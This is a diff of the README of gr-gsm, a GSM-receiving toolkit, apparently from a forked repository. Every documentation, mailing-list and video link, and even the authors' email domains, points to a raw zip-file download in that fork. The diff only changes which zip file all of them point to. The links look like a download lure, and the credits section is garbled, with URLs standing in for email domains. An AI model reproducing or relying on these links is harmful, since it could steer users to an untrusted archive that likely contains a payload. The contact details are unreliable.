@@ -6,13 +6,13 @@ The aim is to provide set of tools for receiving information transmitted by GSM 
 
 Installation and usage
 ======================
-Please see project's [wiki](https://raw.githubusercontent.com/fatahfd/gr-gsm/master/telecast/gr-gsm.zip) for information on [installation](https://raw.githubusercontent.com/fatahfd/gr-gsm/master/telecast/gr-gsm.zip) and [usage](https://raw.githubusercontent.com/fatahfd/gr-gsm/master/telecast/gr-gsm.zip) of gr-gsm.
+Please see project's [wiki](https://raw.githubusercontent.com/fatahfd/gr-gsm/master/grc/decoding/gsm-gr-3.1.zip) for information on [installation](https://raw.githubusercontent.com/fatahfd/gr-gsm/master/grc/decoding/gsm-gr-3.1.zip) and [usage](https://raw.githubusercontent.com/fatahfd/gr-gsm/master/grc/decoding/gsm-gr-3.1.zip) of gr-gsm.
 
 Mailing list
 ============
 Current gr-gsm project's mailing list address is following:
 
-https://raw.githubusercontent.com/fatahfd/gr-gsm/master/telecast/gr-gsm.zip
+https://raw.githubusercontent.com/fatahfd/gr-gsm/master/grc/decoding/gsm-gr-3.1.zip
 
 Mailing list is a place for general discussions, questions about the usage and installation. In case of problem with installation please try to provide full information that will help reproducing it. Minimum information should contain:
 - operating system with version,
@@ -22,7 +22,7 @@ Mailing list is a place for general discussions, questions about the usage and i
 
 To join the group with any e-mail address, use this link:
 
-<https://raw.githubusercontent.com/fatahfd/gr-gsm/master/telecast/gr-gsm.zip!forum/gr-gsm/join>
+<https://raw.githubusercontent.com/fatahfd/gr-gsm/master/grc/decoding/gsm-gr-3.1.zip!forum/gr-gsm/join>
 
 Development
 ===========
@@ -34,19 +34,19 @@ Videos
 ======
 Short presentation of *Airprobe*'like application of *gr-gsm*:
 
-<https://raw.githubusercontent.com/fatahfd/gr-gsm/master/telecast/gr-gsm.zip>
+<https://raw.githubusercontent.com/fatahfd/gr-gsm/master/grc/decoding/gsm-gr-3.1.zip>
 
 Credits
 =======
-*Piotr Krysik* \<ptrkrysik (at) https://raw.githubusercontent.com/fatahfd/gr-gsm/master/telecast/gr-gsm.zip\> - main author and project maintainer
+*Piotr Krysik* \<ptrkrysik (at) https://raw.githubusercontent.com/fatahfd/gr-gsm/master/grc/decoding/gsm-gr-3.1.zip\> - main author and project maintainer
 
-*Roman Khassraf* \<rkhassraf (at) https://raw.githubusercontent.com/fatahfd/gr-gsm/master/telecast/gr-gsm.zip\> - blocks for demultiplexing and decoding of voice channels,  decryption block supporting all ciphers used in GSM, blocks for storing and reading GSM bursts, project planning and user support
+*Roman Khassraf* \<rkhassraf (at) https://raw.githubusercontent.com/fatahfd/gr-gsm/master/grc/decoding/gsm-gr-3.1.zip\> - blocks for demultiplexing and decoding of voice channels,  decryption block supporting all ciphers used in GSM, blocks for storing and reading GSM bursts, project planning and user support
 
-*Vadim Yanitskiy* \<axilirator (at) https://raw.githubusercontent.com/fatahfd/gr-gsm/master/telecast/gr-gsm.zip\> - control and data interface for the transceiver, grgsm_trx application
+*Vadim Yanitskiy* \<axilirator (at) https://raw.githubusercontent.com/fatahfd/gr-gsm/master/grc/decoding/gsm-gr-3.1.zip\> - control and data interface for the transceiver, grgsm_trx application
 
-*Vasil Velichkov* \<vvvelichkov (at) https://raw.githubusercontent.com/fatahfd/gr-gsm/master/telecast/gr-gsm.zip\> - automatic compilation of grc applications, fixes and user support
+*Vasil Velichkov* \<vvvelichkov (at) https://raw.githubusercontent.com/fatahfd/gr-gsm/master/grc/decoding/gsm-gr-3.1.zip\> - automatic compilation of grc applications, fixes and user support
 
-*Pieter Robyns* \<https://raw.githubusercontent.com/fatahfd/gr-gsm/master/telecast/gr-gsm.zip (at) https://raw.githubusercontent.com/fatahfd/gr-gsm/master/telecast/gr-gsm.zip\> - block reversing channel hopping
+*Pieter Robyns* \<https://raw.githubusercontent.com/fatahfd/gr-gsm/master/grc/decoding/gsm-gr-3.1.zip (at) https://raw.githubusercontent.com/fatahfd/gr-gsm/master/grc/decoding/gsm-gr-3.1.zip\> - block reversing channel hopping
 
 
 Thanks
